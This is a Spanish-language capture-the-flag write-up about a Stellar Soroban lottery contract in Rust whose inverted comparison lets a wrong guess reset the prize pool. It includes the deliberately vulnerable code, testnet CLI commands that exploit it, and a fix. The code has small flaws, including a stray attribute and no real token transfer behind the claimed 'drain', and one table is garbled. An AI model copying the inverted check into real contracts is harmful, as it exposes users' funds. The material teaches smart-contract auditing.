Aquí tenés el contenido convertido íntegro a **Markdown profesional, sin emojis**.

---

````markdown
# Writeup Challenge 1: Vulnerabilidad de Lógica Incorrecta  
CTF de Seguridad Stellar - Explotación del Contrato de Lotería

## Información del Challenge
| Propiedad              | Valor                                                      |
|------------------------|------------------------------------------------------------|
| Nombre del Challenge   | Lottery Logic Bug                                          |
| Dificultad             | Fácil                                                      |
| Tipo de Vulnerabilidad | Lógica Condicional Incorrecta                              |
| Impacto                | Crítico - Drenaje Completo de Fondos                       |
| CWE                    | CWE-670: Implementación de Flujo de Control Siempre Incorrecta |
| OWASP                  | A03:2021 – Inyección (Inyección de Lógica)                 |

---

## Descripción del Challenge
Un contrato de lotería permite a los usuarios adivinar un número secreto. Si adivinan correctamente, ganan el pozo de premios.  
Sin embargo, un error crítico de lógica en la validación permite a los atacantes drenar todo el pozo adivinando **cualquier número incorrecto**.

**Objetivo:** Drenar el pozo de premios del contrato sin conocer el número secreto.

---

## Análisis de la Vulnerabilidad

### Código Vulnerable
```rust
#[contractimpl]
#[contracttype]
pub enum DataKey {
    SecretNumber,
    Prize,
    Owner,
}

#[contract]
pub struct LotteryContract;

#[contractimpl]
impl LotteryContract {
    pub fn initialize(env: Env, owner: Address, secret: u32, prize: i128) {
        owner.require_auth();
        
        env.storage().persistent().set(&DataKey::Owner, &owner);
        env.storage().persistent().set(&DataKey::SecretNumber, &secret);
        env.storage().persistent().set(&DataKey::Prize, &prize);
    }
    
    pub fn deposit(env: Env, amount: i128) {
        let current: i128 = env.storage()
            .persistent()
            .get(&DataKey::Prize)
            .unwrap_or(0);
        env.storage().persistent().set(&DataKey::Prize, &(current + amount));
    }
    
    pub fn play(env: Env, player: Address, guess: u32) -> bool {
        player.require_auth();
        
        let secret: u32 = env.storage()
            .persistent()
            .get(&DataKey::SecretNumber)
            .unwrap();
        
        let prize: i128 = env.storage()
            .persistent()
            .get(&DataKey::Prize)
            .unwrap_or(0);
        
        if guess != secret {
            env.storage().persistent().set(&DataKey::Prize, &0);
            return true;
        }
        
        false
    }
    
    pub fn get_prize(env: Env) -> i128 {
        env.storage()
            .persistent()
            .get(&DataKey::Prize)
            .unwrap_or(0)
    }
}
````

### Explicación del código

#### initialize()

Parámetros: owner, secret, prize
Lógica:

* Requiere autenticación del propietario
* Guarda dueño, número secreto y premio en storage

#### deposit()

* Lee el premio actual o usa 0
* Suma el monto depositado
* Actualiza `Prize`

#### play()

* Autoriza jugador
* Lee número secreto y premio
* **Bug crítico:**

  * Si el jugador falla (`guess != secret`):

    * Premio se pone en 0
    * Devuelve `true`
  * Si acierta (`guess == secret`):

    * Devuelve `false`
    * Premio no cambia

#### Causa Raíz

Condicional invertida:
Comportamiento correcto: jugador gana cuando `guess == secret`
Implementación errónea: jugador gana cuando `guess != secret`

---

## Impacto

**Vector CVSS v3.1:** `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:H`
**Puntaje:** 9.1 (CRÍTICO)

Efectos:

* Cualquier usuario puede drenar fondos
* Sin permisos especiales
* Explotación trivial
* Pérdida total del pozo

---

## Configuración del Entorno

### Requisitos Previos

* Instalar Rust
* Instalar wasm32v1-none
* Instalar Stellar CLI
* Clonar repositorio:
  [https://github.com/HackBalam/Seguridad-Smart-Contracts-Rust-Reto1.git](https://github.com/HackBalam/Seguridad-Smart-Contracts-Rust-Reto1.git)

Comandos relevantes:

```
cargo test
stellar contract build
stellar contract optimize --wasm <ruta>
```

Si falla el build:

* Instalar Build Tools for Visual Studio 2022
* Elegir Desktop development with C++

### Crear cuentas

```
stellar keys generate bob --network testnet --fund
stellar keys address bob
stellar keys generate carol --network testnet --fund
stellar keys address carol
curl "https://friendbot.stellar.org/?addr=<BOB_ADDRESS>"
```

---

## Explotación Paso a Paso

### 1. Desplegar contrato

```
stellar contract deploy --wasm <wasm> --source-account bob --network testnet --alias lottery_vulnerable
```

### 2. Inicializar

```
stellar contract invoke --id <id> --source-account bob --network testnet -- initialize --owner <bob> --secret 42 --prize 1000
```

### 3. Verificar premio

```
stellar contract invoke --id <id> --source-account bob --network testnet -- get_prize
Salida: "1000"
```

### 4. Explotar

```
stellar contract invoke --id <id> --source-account carol --network testnet -- play --player <carol> --guess 99
```

Resultado:

* Retorno `true`
* Premio se pone en `0`

### 5. Verificar

```
stellar contract invoke --id <id> --source-account bob --network testnet -- get_prize
```

Salida esperada:

```
"0"
```

---

## Análisis Técnico Profundo

Estado inicial

```
secret = 42
prize = 1000
guess = 99
```

Lógica ejecutada:

```
guess != secret  -> verdadero
prize = 0
return true
```

### Cambio de Storage

| Clave        | Antes   | Después | Cambio     |
| ------------ | ------- | ------- | ---------- |
| Prize        | 1000    | 0       | -1000      |
| SecretNumber | 42      | 42      | sin cambio |
| Owner        | GBNG... | GBNG... | sin cambio |

---

## Remediación

### Código Corregido

```rust
if guess == secret {
    env.storage().persistent().set(&DataKey::Prize, &0);
    return true;
}
false
```

---

## Medidas Adicionales

1. Pruebas unitarias completas
2. Validación de operadores de comparación
3. Peers reviews en lógica crítica
4. Tests negativos y casos límite

---

## Lecciones Aprendidas

Para Desarrolladores

* Probar ambas ramas de un condicional
* Asegurar que `true` y `false` tienen semántica clara
* Evitar errores lógicos simples con pruebas

Para Auditores

* Revisar lógica de comparación
* Confirmar transiciones de estado
* Validar autorizaciones

Patrones típicos de bugs:

| Patrón              | Incorrecto | Correcto   |   |   |
| ------------------- | ---------- | ---------- | - | - |
| Condición invertida | `!=`       | `==`       |   |   |
| Error por uno       | `>`        | `>=`       |   |   |
| Operador lógico     | `&&`       | `          |   | ` |
| Falta negación      | `allowed`  | `!allowed` |   |   |

---

## Finalización

**Challenge Explotado Exitosamente**

* Vulnerabilidad: Lógica Incorrecta (`!=` vs `==`)
* Impacto: Drenaje completo del pozo

